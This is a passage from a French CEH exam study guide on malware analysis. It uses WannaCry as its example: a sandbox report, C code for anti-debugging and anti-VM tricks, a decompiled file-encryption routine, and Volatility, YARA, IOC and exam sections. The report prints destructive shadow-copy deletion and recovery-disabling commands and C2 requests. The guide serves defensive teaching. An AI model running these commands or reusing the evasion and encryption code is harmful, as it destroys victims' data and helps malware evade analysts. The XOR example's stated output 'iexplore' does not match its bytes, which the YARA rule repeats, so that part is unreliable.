      "description": "Injected code into svchost.exe via CreateRemoteThread"
    }
  ],

  "behavior": {
    "processes": [
      {
        "pid": 4892,
        "name": "malware.exe",
        "children": [
          {"pid": 5012, "name": "cmd.exe", 
           "command": "vssadmin delete shadows /all /quiet"},
          {"pid": 5013, "name": "cmd.exe",
           "command": "bcdedit /set {default} recoveryenabled No"},
          {"pid": 5014, "name": "tasksche.exe",
           "command": "C:\\Windows\\tasksche.exe /i"}
        ]
      }
    ],

    "files": {
      "created": [
        "C:\\Windows\\tasksche.exe",
        "C:\\Windows\\mssecsvc.exe",
        "C:\\ProgramData\\sqjhfvxmri\\@WanaDecryptor@.exe"
      ],
      "modified": [
        {"path": "C:\\Users\\user\\Documents\\*", 
         "count": 2847,
         "extension_change": ".docx → .docx.WNCRY"}
      ]
    },

    "registry": {
      "set": [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssecsvc2.0\\Start"
      ]
    },

    "network": {
      "hosts": ["185.220.101.45", "192.168.1.15"],
      "domains": ["ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com"],
      "http": [
        {"uri": "http://185.220.101.45/gate.php", "method": "GET"},
        {"uri": "http://ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com/", "method": "GET"}
      ],
      "smtp": []
    }
  },

  "dropped_files": [
    {
      "name": "@WanaDecryptor@.exe",
      "type": "PE32 executable",
      "md5": "7bf2b57f2a205768755c07f238fb32cc"
    },
    {
      "name": "README_DECRYPT.txt",
      "content": "Ooops, your files have been encrypted!\n..."
    }
  ]
}
```

---

## 📌 PARTIE 4 : TECHNIQUES ANTI-ANALYSE — CE QUE LES MALWARES FONT POUR SE CACHER

Comprendre les techniques anti-analyse est **essentiel pour un analyste professionnel**.

---

### 🔵 Anti-Debugging

```c
// Technique 1 : IsDebuggerPresent (API Windows)
if (IsDebuggerPresent()) {
    ExitProcess(0);    // Quitte si debugger détecté
}

// Technique 2 : CheckRemoteDebuggerPresent
BOOL bDebuggerPresent;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent);
if (bDebuggerPresent) { /* Anti-debug action */ }

// Technique 3 : NtQueryInformationProcess
// Interroge le kernel directement (plus difficile à patcher)

// Technique 4 : Timing check
// Un debugger ralentit l'exécution
DWORD start = GetTickCount();
// Opération normale...
DWORD end = GetTickCount();
if (end - start > 1000) {
    // Trop lent → debugger présent !
    ExitProcess(0);
}

// Technique 5 : Heap flags
// Un processus débogué a des flags spéciaux dans le PEB
PPEB peb = (PPEB)__readfsdword(0x30);
if (peb->NtGlobalFlag & 0x70) {
    // Debugger détecté
}
```

---

### 🔵 Anti-VM (Anti-VirtualMachine)

```c
// Technique 1 : Vérifier les artefacts VMware
// Clés registre VMware
HKEY hKey;
if (RegOpenKey(HKEY_LOCAL_MACHINE, 
    "SOFTWARE\\VMware, Inc.\\VMware Tools", &hKey) == ERROR_SUCCESS) {
    ExitProcess(0);    // VMware détecté !
}

// Technique 2 : Vérifier les processus VM
char* vmProcesses[] = {
    "vmtoolsd.exe",     // VMware Tools
    "vmwaretray.exe",   // VMware
    "vboxservice.exe",  // VirtualBox
    "vboxtray.exe",     // VirtualBox
    "qemu-ga.exe",      // QEMU
    "prl_tools.exe"     // Parallels
};

// Technique 3 : CPUID instruction
// Retourne des infos sur le processeur
// Les VMs ont des signatures caractéristiques

// Technique 4 : MAC Address check
// VMware : 00:0C:29, 00:50:56
// VirtualBox : 08:00:27

// Technique 5 : Nombre de processus actifs
// Un vrai PC a 50+ processus
// Une sandbox peut en avoir moins
if (GetProcessCount() < 30) {
    ExitProcess(0);
}

// Technique 6 : User interaction check
// Vérifier les mouvements de souris
// Les sandboxes n'ont souvent pas d'interaction humaine
POINT pt1, pt2;
GetCursorPos(&pt1);
Sleep(5000);
GetCursorPos(&pt2);
if (pt1.x == pt2.x && pt1.y == pt2.y) {
    ExitProcess(0);    // Pas de mouvement = sandbox
}
```

---

### 🔵 Obfuscation et Packing

```
TECHNIQUES D'OBFUSCATION :

PACKING (compression + chiffrement) :
├── UPX          → Packer open source, facile à dépacker
├── Themida      → Packer commercial, très fort
├── VMProtect    → Protection par virtualisation du code
├── Enigma       → Packer commercial
└── Custom packer → Packer fait maison, difficile à analyser

CHIFFREMENT DU CODE :
├── XOR encoding  → Simple mais utilisé massivement
│   key = 0x41
│   for each byte: encrypted[i] = original[i] ^ key
│
├── RC4, AES     → Chiffrement des strings et du payload
└── Custom algo  → Algorithme propriétaire

EXEMPLE OBFUSCATION XOR :
```

```python
# Déchiffrement d'une string obfusquée par XOR
encrypted = [0x28, 0x25, 0x37, 0x25, 0x27, 0x24, 0x26, 0x20, 0x28]
key = 0x41

decrypted = ''.join(chr(b ^ key) for b in encrypted)
print(f"String déchiffrée : {decrypted}")
# Output: "iexplore"  ← Nom de processus cible pour injection !
```

```
TECHNIQUES AVANCÉES :
├── Code virtualization → Traduit le code en bytecode propriétaire
│   → Nécessite un émulateur pour "exécuter"
│   → VMProtect, Tigress, Code Virtualizer
│
├── Metamorphisme → Réécrit entièrement le code à chaque réplication
│   → Aucune signature identique entre deux samples
│
└── Polymorphisme → Chiffre le code avec une clé différente à chaque fois
    → Le déchiffreur (stub) reste constant → détectable
```

---

### 🛠️ GHIDRA — Reverse Engineering avancé

**Ghidra** (prononcé "Gee-druh") est l'outil de reverse engineering développé par la **NSA** et rendu open source en 2019. Il décompile les binaires en code C lisible.

```
Ghidra Analysis — malware.exe
════════════════════════════════════════════════════════════════════

─── FONCTIONS IDENTIFIÉES ────────────────────────────────────────
FUN_00401000    Entry point (WinMain)
FUN_00401234    CheckDebugger()
FUN_00401456    CheckVMEnvironment()
FUN_00401678    DecryptPayload()
FUN_00401900    InjectIntoProcess()
FUN_00402100    ScanNetworkSMB()
FUN_00402400    EncryptFiles()
FUN_00402800    ConnectC2()
FUN_00403000    CreatePersistence()

─── DÉCOMPILATION FUN_00401234 (CheckDebugger) ────────────────────

bool CheckDebugger(void) {
  BOOL bDebugger;
  PPEB pPEB;
  
  // Check 1: IsDebuggerPresent API
  if (IsDebuggerPresent() != 0) {
    return true;
  }
  
  // Check 2: PEB NtGlobalFlag
  pPEB = (PPEB)__readfsdword(0x30);
  if ((pPEB->NtGlobalFlag & 0x70) != 0) {
    return true;
  }
  
  // Check 3: Timing
  DWORD tick1 = GetTickCount();
  Sleep(100);
  DWORD tick2 = GetTickCount();
  if (tick2 - tick1 > 500) {
    return true;   // Trop lent → debugger présent
  }
  
  return false;
}

─── DÉCOMPILATION FUN_00402400 (EncryptFiles) ─────────────────────

void EncryptFiles(char *targetDir) {
  WIN32_FIND_DATA findData;
  HANDLE hFind;
  char searchPath[MAX_PATH];
  char encKey[32];
  
  // Génère clé AES depuis clé RSA publique C2
  GenerateAESKey(encKey, g_RSAPublicKey);
  
  snprintf(searchPath, MAX_PATH, "%s\\*.*", targetDir);
  hFind = FindFirstFile(searchPath, &findData);
  
  do {
    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
      
      // Vérifie l'extension
      char *ext = GetFileExtension(findData.cFileName);
      if (IsTargetExtension(ext)) {  // .doc, .xls, .pdf, .jpg...
        
        // Chiffre le fichier avec AES-128-CBC
        EncryptFileAES(findData.cFileName, encKey);
        
        // Renomme avec extension .WNCRY
        char newName[MAX_PATH];
        snprintf(newName, MAX_PATH, "%s.WNCRY", findData.cFileName);
        MoveFile(findData.cFileName, newName);
      }
    }
    
    // Récursion dans les sous-répertoires
    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      if (strcmp(findData.cFileName, ".") != 0 && 
          strcmp(findData.cFileName, "..") != 0) {
        EncryptFiles(findData.cFileName);   // Récursion !
      }
    }
    
  } while (FindNextFile(hFind, &findData));
  
  FindClose(hFind);
  
  // Dépose la note de rançon
  DropRansomNote(targetDir);
}
```

---

## 📌 PARTIE 5 : VOLATILITY — FORENSIQUE MÉMOIRE

**Volatility** est le framework de référence pour l'analyse de dumps mémoire RAM. Extrêmement utile pour les malwares fileless.

```bash
# Identifier le profil du dump
vol.py -f memory.dmp imageinfo
```

**Sortie :**
```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/forensics/memory.dmp)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002c4a0a0L
          Number of Processors : 4
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002c4bd00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
               Image date/time : 2024-11-15 18:05:32 UTC+0000
         Image local date/time : 2024-11-15 20:05:32 +0200
```

```bash
# Lister les processus actifs
vol.py -f memory.dmp --profile=Win7SP1x64 pslist
```

**Sortie :**
```
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                PID   PPID  Thds  Hnds  Time
------------------ ----------------    ----  ----  ----  ----  ----
0xfffffa8000c96960 System              4     0     82    475   2024-11-15
0xfffffa8001c1ab30 smss.exe            272   4     3     37    2024-11-15
0xfffffa8001e3c060 csrss.exe           360   344   10    542   2024-11-15
0xfffffa80021a3060 winlogon.exe        404   344   5     117   2024-11-15
0xfffffa80022a4060 services.exe        472   404   11    211   2024-11-15
0xfffffa8002309b30 lsass.exe           480   404   7     591   2024-11-15
0xfffffa80024c5060 svchost.exe         624   472   11    364   2024-11-15
0xfffffa80027a3060 svchost.exe         692   472   8     268   2024-11-15
0xfffffa8002a15060 explorer.exe        1840  1812  25    873   2024-11-15
0xfffffa8002b12060 malware.exe         4892  1840  8     123   2024-11-15 ← MALWARE !
0xfffffa8002c44060 svchost.exe         5021  4892  3     45    2024-11-15 ← Processus injecté !
0xfffffa8002d55060 cmd.exe             5034  4892  1     22    2024-11-15
```

```bash
# Détecter les injections de code
vol.py -f memory.dmp --profile=Win7SP1x64 malfind
```

**Sortie :**
```
Volatility Foundation Volatility Framework 2.6
Process: svchost.exe Pid: 5021 Address: 0x1f0000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE  ← SUSPECT !
Flags: CommitCharge: 32, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x001f0000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00   MZ..............
0x001f0010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00   ........@.......
0x001f0020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................

→ MZ header dans svchost.exe → DLL INJECTÉE !
→ PAGE_EXECUTE_READWRITE = zone mémoire exécutable écrite dynamiquement

Process: svchost.exe Pid: 5021 Address: 0x1f0000
Disassembly:
0x001f0000 4d               DEC EBP
0x001f0001 5a               POP EDX
0x001f0002 90               NOP
...
```

```bash
# Extraire le code injecté pour analyse
vol.py -f memory.dmp --profile=Win7SP1x64 \
       procdump --pid 5021 --dump-dir /forensics/dumps/
```

```bash
# Extraire les connexions réseau
vol.py -f memory.dmp --profile=Win7SP1x64 netscan
```

**Sortie :**
```
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto  Local Address         Foreign Address    State   Pid    Owner
0x7d9a8cd0         TCPv4  192.168.1.20:49152    185.220.101.45:80  ESTABLISHED 4892 malware.exe
0x7d9b1240         TCPv4  192.168.1.20:49153    192.168.1.15:445   SYN_SENT    4892 malware.exe
0x7d9c3450         TCPv4  0.0.0.0:445           0.0.0.0:0          LISTENING   4     System
```

---

## 📌 PARTIE 6 : YARA — ÉCRIRE DES RÈGLES DE DÉTECTION

**YARA** est le standard pour créer des **règles de détection de malwares** basées sur des patterns.

```bash
# Installer YARA
sudo apt install yara
```

**Écrire une règle YARA pour détecter WannaCry :**

```yara
rule WannaCry_Ransomware {
    meta:
        author      = "exploit4040 - Team localhost"
        date        = "2024-11-15"
        description = "Détecte WannaCry ransomware"
        severity    = "critical"
        hash        = "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
        reference   = "CVE-2017-0144"

    strings:
        // Strings caractéristiques de WannaCry
        $str1 = "WanaCrypt0r" ascii wide
        $str2 = ".WNCRY" ascii wide
        $str3 = "@WanaDecryptor@" ascii wide
        $str4 = "tasksche.exe" ascii wide
        $str5 = "mssecsvc.exe" ascii wide
        
        // URL du kill switch
        $killswitch = "ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        
        // Note de rançon
        $ransom_note = "Ooops, your files have been encrypted" ascii wide
        
        // Pattern hexadécimal (bytes caractéristiques)
        $hex_pattern = { 45 78 74 65 6E 73 69 6F 6E 20 6F 66 20 6B 65 79 }
        
        // Pattern XOR obfusqué (clé 0x41)
        $xor_pattern = { 28 25 37 25 27 24 26 20 28 }  // "iexplore" XOR 0x41

    condition:
        uint16(0) == 0x5A4D and     // Fichier PE (MZ header)
        filesize < 10MB and          // Taille raisonnable
        (
            4 of ($str*) or          // 4 strings sur 5 présentes
            $killswitch or           // URL kill switch
            $ransom_note or          // Note de rançon
            ($hex_pattern and $xor_pattern)
        )
}
```

```bash
# Appliquer la règle sur un fichier
yara wannacry_rule.yar malware.exe
```

**Sortie :**
```
WannaCry_Ransomware malware.exe
```

```bash
# Scanner un répertoire entier
yara -r wannacry_rule.yar /Windows/

# Scanner avec toutes les règles d'un répertoire
yara -r /usr/share/yara-rules/ /target/
```

**Sortie scan répertoire :**
```
WannaCry_Ransomware /Windows/Temp/svchost32.exe
WannaCry_Ransomware /Windows/mssecsvc.exe
WannaCry_Ransomware /ProgramData/sqjhfvxmri/tasksche.exe

→ 3 fichiers correspondant à la règle WannaCry détectés !
```

---

## 📌 PARTIE 7 : IOC — INDICATEURS DE COMPROMISSION

Les **IOCs** sont les preuves laissées par un malware. Ils servent à **détecter et bloquer** les infections futures.

```
TYPES D'IOCs EXTRAITS D'UNE ANALYSE :

FICHIERS :
├── Hash MD5/SHA256 des fichiers malveillants
├── Noms de fichiers suspects (mssecsvc.exe, tasksche.exe)
├── Chemins de dépôt (C:\Windows\Temp\, %APPDATA%)
└── Extensions inhabituelles (.WNCRY, .locked, .encrypted)

RÉSEAU :
├── IPs des serveurs C2
├── Domaines C2
├── URLs spécifiques (/gate.php, /checkin, /update)
├── User-Agents inhabituels
└── Ports inhabituels (6200 pour vsftpd backdoor)

REGISTRE :
├── Clés de persistance créées
├── Services malveillants installés
└── Valeurs inhabituelles dans Run keys

MÉMOIRE :
├── Strings caractéristiques en mémoire
├── Patterns YARA
└── Séquences d'opcodes (bytecode)

COMPORTEMENT :
├── Suppression des shadow copies
├── Désactivation de la récupération
├── Chiffrement massif de fichiers
└── Scan SMB interne
```

**Format STIX/TAXII pour partage d'IOCs :**

```json
{
  "type": "indicator",
  "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98129b4f1b47",
  "created": "2024-11-15T18:00:00.000Z",
  "name": "WannaCry C2 IP",
  "pattern": "[ipv4-addr:value = '185.220.101.45']",
  "pattern_type": "stix",
  "valid_from": "2024-11-15T18:00:00Z",
  "labels": ["malicious-activity", "ransomware", "wannacry"],
  "kill_chain_phases": [
    {
      "kill_chain_name": "mitre-attack",
      "phase_name": "command-and-control"
    }
  ]
}
```

---

## 📌 PARTIE 8 : WORKFLOW PROFESSIONNEL D'ANALYSE MALWARE

```
PROCÉDURE STANDARD D'ANALYSE MALWARE
═══════════════════════════════════════════════════════════════════

PHASE 1 : PRÉPARATION (30 min)
  ├── Préparer la VM sandbox (snapshot propre)
  ├── Configurer l'isolation réseau
  ├── Démarrer les outils de monitoring (Procmon, Wireshark, Regshot)
  └── Documenter l'environnement (OS, version, date)

PHASE 2 : ANALYSE STATIQUE (1-2h)
  ├── Hachage + VirusTotal lookup
  ├── Identification du type (strings, die, exiftool)
  ├── Analyse PE (pestudio)
  ├── Strings extraction
  ├── Import/Export analysis
  └── Entropie des sections (détection packing)

PHASE 3 : ANALYSE DYNAMIQUE (1-2h)
  ├── Snapshot VM avant exécution
  ├── Lancer Procmon + Wireshark + Regshot
  ├── Exécuter le malware
  ├── Observer le comportement 5-10 minutes
  ├── Arrêter la VM
  └── Analyser les captures

PHASE 4 : ANALYSE AVANCÉE (2-4h, si nécessaire)
  ├── Débugging avec x64dbg
  ├── Décompilation avec Ghidra/IDA
  ├── Forensique mémoire avec Volatility
  └── Bypass des anti-analyses

PHASE 5 : DOCUMENTATION ET IOCs (1h)
  ├── Extraire tous les IOCs
  ├── Écrire règles YARA
  ├── Documenter le comportement
  ├── Attribuer à famille connue (si possible)
  └── Rédiger le rapport

PHASE 6 : REMÉDIATION
  ├── Bloquer les IOCs (firewall, EDR, SIEM)
  ├── Scanner le réseau avec règles YARA
  ├── Investiguer les machines potentiellement infectées
  └── Corriger les vulnérabilités exploitées
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ 8 types de malwares — définitions, exemples, mécanismes
✅ Virus vs Worm — différences de propagation
✅ Types de trojans — RAT, Banker, Dropper, Rootkit
✅ Types de rootkits — User/Kernel/Boot/Hypervisor/Firmware
✅ Ransomware — cycle d'attaque + exemples (WannaCry, NotPetya)
✅ Fileless malware — techniques et outils (PowerShell, WMI, LotL)
✅ Analyse statique — hachage, strings, PE format, entropie
✅ Analyse dynamique — Procmon, Regshot, Wireshark, Cuckoo
✅ Anti-analysis — IsDebuggerPresent, anti-VM, obfuscation, packing
✅ UPX — qu'est-ce qu'un packer et comment dépacker
✅ Ghidra/IDA — décompilation et reverse engineering
✅ Volatility — forensique mémoire, malfind, netscan
✅ YARA — écrire et appliquer des règles de détection
✅ IOCs — types, extraction, format STIX
✅ VirusTotal — utilisation et interprétation des résultats
✅ Cuckoo Sandbox — analyse automatisée et lecture du rapport
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 7

**Q1 :** Quelle est la différence fondamentale entre un virus et un worm ?
> **Réponse : Un virus a besoin d'un fichier hôte et d'une action humaine pour se propager. Un worm se propage de façon autonome sur le réseau en exploitant des vulnérabilités, sans intervention humaine.**

**Q2 :** Quel type de rootkit s'installe dans le BIOS/UEFI et survit au formatage complet du disque ?
> **Réponse : Firmware rootkit (ex: LoJax d'APT28)**

**Q3 :** Un malware a une entropie de 7.9/8.0 dans sa section .text. Que cela signifie-t-il ?
> **Réponse : Entropie très haute = code probablement compressé, chiffré ou packagé. Le code légitime a une entropie de 4-6. Il faut le dépacker avant analyse.**

**Q4 :** Quelle technique anti-analyse vérifie si la souris a bougé pendant l'exécution ?
> **Réponse : Anti-sandbox via user interaction check. Les sandboxes automatisées n'ont pas d'interaction humaine → pas de mouvement de souris → malware se désactive.**

**Q5 :** Quelle commande Volatility détecte les injections de code dans les processus Windows ?
> **Réponse : `vol.py -f memory.dmp --profile=Win7SP1x64 malfind` — détecte les zones mémoire PAGE_EXECUTE_READWRITE contenant des headers PE**

**Q6 :** Qu'est-ce qu'un malware fileless et pourquoi est-il difficile à détecter ?
> **Réponse : Il s'exécute entièrement en mémoire RAM sans écrire de fichier sur le disque. Les antivirus traditionnels analysent les fichiers → inefficaces. Disparaît au redémarrage si pas de persistance.**

**Q7 :** Quelle est la différence entre un ransomware de type Crypto et de type Locker ?
> **Réponse : Crypto = chiffre les fichiers (documents, photos). Locker = bloque l'accès à l'interface de l'OS entier. Crypto est plus dévastateur car les données sont inaccessibles même en réinstallant.**

**Q8 :** WannaCry possédait un "kill switch". Comment fonctionnait-il ?
> **Réponse : WannaCry tentait de se connecter à un domaine spécifique (ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com). Si le domaine répondait, le malware s'arrêtait. Marcus Hutchins a enregistré ce domaine pour $10.69, stoppant la propagation mondiale.**

**Q9 :** Quel outil open source permet l'analyse forensique de dumps mémoire RAM pour trouver des malwares fileless ?
> **Réponse : Volatility Framework**

**Q10 :** Quelle est l'utilité de YARA dans un contexte de réponse à incident ?
> **Réponse : YARA permet d'écrire des règles de détection basées sur des patterns (strings, bytes, conditions). On peut scanner rapidement des milliers de fichiers pour trouver des variants du même malware, même si le hash a changé.**
